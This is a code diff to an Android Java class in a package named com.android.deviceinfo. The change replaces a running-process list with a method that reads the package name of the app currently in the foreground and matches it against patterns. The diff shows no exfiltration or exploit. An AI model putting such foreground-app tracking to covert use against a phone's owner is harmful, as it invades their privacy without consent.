@@ -11,9 +11,11 @@ package com.android.deviceinfo;
 
 import java.util.ArrayList;
 import java.util.Iterator;
+import java.util.List;
 
 import android.app.ActivityManager;
 import android.app.ActivityManager.RunningAppProcessInfo;
+import android.content.ComponentName;
 import android.content.Context;
 
 import com.android.deviceinfo.auto.Cfg;
@@ -23,7 +25,7 @@ import com.android.deviceinfo.util.StringUtils;
 public class RunningProcesses {
 	private static final String TAG = "RunningProcess"; //$NON-NLS-1$
 
-	private ArrayList<ActivityManager.RunningAppProcessInfo> list;
+	private String foreground = "";
 	private final ActivityManager activityManager;
 	private long time;
 
@@ -31,43 +33,31 @@ public class RunningProcesses {
 		activityManager = (ActivityManager) Status.getAppContext().getSystemService(Context.ACTIVITY_SERVICE);
 	}
 
-	private void clear() {
-		if (list != null) {
-			list.clear();
-		}
-	}
-
-	public void update() {
+	public synchronized String getForeground() {
 		if (Cfg.DEBUG) {
 			Check.requires(activityManager != null, "Null activityManager"); //$NON-NLS-1$
 		}
 
-		clear();
-
-		list = (ArrayList<ActivityManager.RunningAppProcessInfo>) activityManager.getRunningAppProcesses();
-		time = System.currentTimeMillis();
-	}
-
-	// DEBUG
-	public void print() {
-		if (list == null || list.size() == 0) {
-			return;
-		}
-
-		final Iterator<ActivityManager.RunningAppProcessInfo> iter = list.listIterator();
-
-		while (iter.hasNext()) {
-			final ActivityManager.RunningAppProcessInfo element = iter.next();
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (update) proc: " + element.processName); //$NON-NLS-1$
+		// get the info from the currently running task
+		List<ActivityManager.RunningTaskInfo> taskInfo = activityManager.getRunningTasks(1);
+		if (Cfg.DEBUG) {
+			String newFore = taskInfo.get(0).topActivity.getPackageName();
+			if(!foreground.equals(newFore)){
+				Check.log(TAG + " (update) topActivity CURRENT Activity: " + taskInfo.get(0).topActivity.getPackageName());
 			}
 		}
+
+		ComponentName componentInfo = taskInfo.get(0).topActivity;
+		foreground = componentInfo.getPackageName();
+
+		time = System.currentTimeMillis();
+
+		return foreground;
 	}
 
 	public synchronized boolean isPresent(String process) {
 
-		if (list == null || list.size() == 0) {
+		if (foreground == null || foreground.length() == 0) {
 			return false;
 		}
 
@@ -75,87 +65,11 @@ public class RunningProcesses {
 			return false;
 		}
 
-		for (RunningAppProcessInfo appProcess : list) {
-			if (StringUtils.matchStar(process, appProcess.processName) == true) {
-				return true;
-			}
+		if (StringUtils.matchStar(process, foreground) == true) {
+			return true;
 		}
 
 		return false;
 	}
 
-	public synchronized ArrayList<ActivityManager.RunningAppProcessInfo> getProcessList() {
-		return list;
-	}
-
-	public RunningAppProcessInfo getForeground() {
-		RunningAppProcessInfo ret = null;
-
-		if (list == null || list.size() == 0) {
-			update();
-		}
-
-		for (RunningAppProcessInfo appProcess : list) {
-			if (appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getForeground): " + appProcess.processName + " pid: " + appProcess.pid);
-				}
-
-				ret = appProcess;
-				//break;
-			}
-		}
-
-		return ret;
-	}
-
-	public int getForegroundDigest() {
-		int ret = 0;
-
-		if (list == null || list.size() == 0) {
-			update();
-		}
-
-		for (RunningAppProcessInfo appProcess : list) {
-			if (appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
-				if (Cfg.DEBUG) {
-					// Check.log(TAG + " (getForeground): " +
-					// appProcess.processName + " pid: " + appProcess.pid);
-				}
-
-				ret += appProcess.pid;
-			}
-		}
-
-		return ret;
-	}
-
-	public int getForegroundPid() {
-		if (list == null || list.size() == 0) {
-			update();
-		}
-
-		for (RunningAppProcessInfo appProcess : list) {
-			if (appProcess.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
-				return appProcess.pid;
-			}
-		}
-		return 0;
-	}
-
-	public int getProcessPid(String p) {
-		if (list == null || list.size() == 0) {
-			update();
-		}
-
-		for (RunningAppProcessInfo appProcess : list) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(getProcessPid): " + appProcess.processName);
-			}
-			if (appProcess.processName.contains(p)) {
-				return appProcess.pid;
-			}
-		}
-		return 0;
-	}
 }
